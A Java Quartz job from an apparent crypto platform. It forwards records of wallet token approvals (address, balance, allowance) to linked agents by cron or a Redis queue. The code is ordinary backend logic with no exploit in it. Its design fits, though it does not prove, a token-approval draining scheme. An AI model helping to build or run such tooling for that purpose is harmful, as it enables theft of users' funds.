package com.inso.modules.coin.approve.job;

import com.alibaba.fastjson.JSONObject;
import com.google.common.collect.Maps;
import com.inso.framework.log.Log;
import com.inso.framework.log.LogFactory;
import com.inso.framework.mq.MQManager;
import com.inso.framework.mq.MQSupport;
import com.inso.framework.service.Callback;
import com.inso.framework.spring.SpringContextUtils;
import com.inso.framework.utils.FastJsonHelper;
import com.inso.framework.utils.StringUtils;
import com.inso.modules.coin.core.model.ApproveAuthInfo;
import com.inso.modules.coin.approve.service.ApproveAuthService;
import com.inso.modules.passport.user.logical.AppNotifyManager;
import com.inso.modules.passport.user.model.UserAttr;
import com.inso.modules.passport.user.service.UserAttrService;
import org.joda.time.DateTime;
import org.quartz.Job;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;

import java.io.IOException;
import java.util.Map;

public class ApproveNotifyMerchantJob implements Job {

    private static Log LOG = LogFactory.getLog(ApproveNotifyMerchantJob.class);

    public static final String TYPE_MQ = "mq";
    public static final String TYPE_CRON_ALL = "cron_all";
    public static final String TYPE_CRON_MINUS = "cron_minius";

    private static String QUEUE_NAME = ApproveNotifyMerchantJob.class.getName();
    private static MQSupport mq = MQManager.getInstance().getMQ(MQManager.MQType.REDIS);

    private ApproveAuthService mApproveAuthService;

    private AppNotifyManager mAppNotifyMgr;

    private UserAttrService mUserAttrService;


    public ApproveNotifyMerchantJob()
    {
        this.mApproveAuthService = SpringContextUtils.getBean(ApproveAuthService.class);
        this.mAppNotifyMgr = SpringContextUtils.getBean(AppNotifyManager.class);

        this.mUserAttrService = SpringContextUtils.getBean(UserAttrService.class);
    }

    @Override
    public void execute(JobExecutionContext context) throws JobExecutionException {
        String type = context.getJobDetail().getJobDataMap().getString("type");
        if(type.equalsIgnoreCase(TYPE_MQ))
        {
            addMQ();
            return;
        }

        DateTime nowTime = new DateTime(context.getFireTime());

        if(type.equalsIgnoreCase(TYPE_CRON_MINUS))
        {

            DateTime fromTime = nowTime.minusMinutes(10);
            DateTime toTime = nowTime.minusMinutes(1);
            handleTask(false, fromTime, toTime);

            //
            fromTime = nowTime.minusMinutes(16);
            toTime = nowTime.minusMinutes(15);
            handleTask(false, fromTime, toTime);

            fromTime = nowTime.minusMinutes(21);
            toTime = nowTime.minusMinutes(20);
            handleTask(false, fromTime, toTime);

            fromTime = nowTime.minusMinutes(31);
            toTime = nowTime.minusMinutes(30);
            handleTask(false, fromTime, toTime);
        }
        else if(type.equalsIgnoreCase(TYPE_CRON_ALL))
        {
            // 半年内重新通知
            DateTime fromTime = nowTime.minusMonths(6);
            handleTask(true, fromTime, nowTime);
        }

    }

    public void test()
    {
        DateTime nowTime = new DateTime();

        DateTime fromTime = nowTime.minusDays(100000);
        handleTask(true, fromTime, nowTime);
    }


    private void handleTask(boolean forceNotify, DateTime fromTime, DateTime toTime)
    {
        mApproveAuthService.queryAll(new Callback<ApproveAuthInfo>() {
            @Override
            public void execute(ApproveAuthInfo o)
            {
                if(!forceNotify && o.getNotifySuccessCount() > 0)
                {
                    // 已经通知过，不用再重新通知
                    return;
                }
                handle(o);
            }
        }, fromTime, toTime);

    }

    private void handle(ApproveAuthInfo approveAuthInfo)
    {
        try {
            if(approveAuthInfo == null)
            {
                return;
            }

            // 不是通知模式-不需要通知
            if(approveAuthInfo.getNotifyTotalCount() < 0)
            {
                return;
            }

            if(approveAuthInfo.getAgentid() <= 0)
            {
                return;
            }

            mApproveAuthService.updateNotifyInfo(approveAuthInfo.getId(), true, false);

            Map<String, String> dataMaps = Maps.newHashMap();
            dataMaps.put("networkType", approveAuthInfo.getCtrNetworkType());
            dataMaps.put("currenType", approveAuthInfo.getCurrencyType());
            dataMaps.put("address", approveAuthInfo.getSenderAddress());

            dataMaps.put("balance", approveAuthInfo.getBalance() + StringUtils.getEmpty());
            dataMaps.put("allowance", approveAuthInfo.getAllowance().toString());

            mAppNotifyMgr.sendApproveNotify(approveAuthInfo.getAgentid(), dataMaps, new Callback<Boolean>() {
                @Override
                public void execute(Boolean o) {
                    mApproveAuthService.updateNotifyInfo(approveAuthInfo.getId(), false, true);
                }
            });



        } catch (Exception e) {
            LOG.error("handle error:", e);
        }
    }



    private void addMQ()
    {
        mq.subscribe(QUEUE_NAME, null, new Callback<String>() {
            public void execute(String o) {

                JSONObject jsonObject = FastJsonHelper.toJSONObject(o);
                if(jsonObject == null || jsonObject.isEmpty())
                {
                    return;
                }

                long userid = jsonObject.getLong("userid");
                long contractid = jsonObject.getLong("contractid");

                if(userid <= 0 || contractid <= 0)
                {
                    return;
                }

                ApproveAuthInfo approveModel = mApproveAuthService.findByUseridAndContractId(false, userid, contractid);
                if(approveModel == null)
                {
                    return;
                }

                UserAttr userAttr = mUserAttrService.find(false, approveModel.getUserid());
                if(userAttr.getAgentid() <= 0)
                {
                    return;
                }
                approveModel.setAgentid(userAttr.getAgentid());
                handle(approveModel);
            }
        });
    }


    public static void sendMQ( ApproveAuthInfo authInfo)
    {
        if(authInfo.getNotifyTotalCount() < 0)
        {
            return;
        }
        Map<String, Object> maps = Maps.newHashMap();
        maps.put("userid", authInfo.getUserid());
        maps.put("contractid", authInfo.getContractId());
        mq.sendMessage(QUEUE_NAME, FastJsonHelper.jsonEncode(maps));
    }

    public static void main(String[] args) throws IOException {
        ApproveNotifyMerchantJob job = new ApproveNotifyMerchantJob();
        job.addMQ();


//        job.sendMQ(1, 1);

        System.in.read();

    }

}

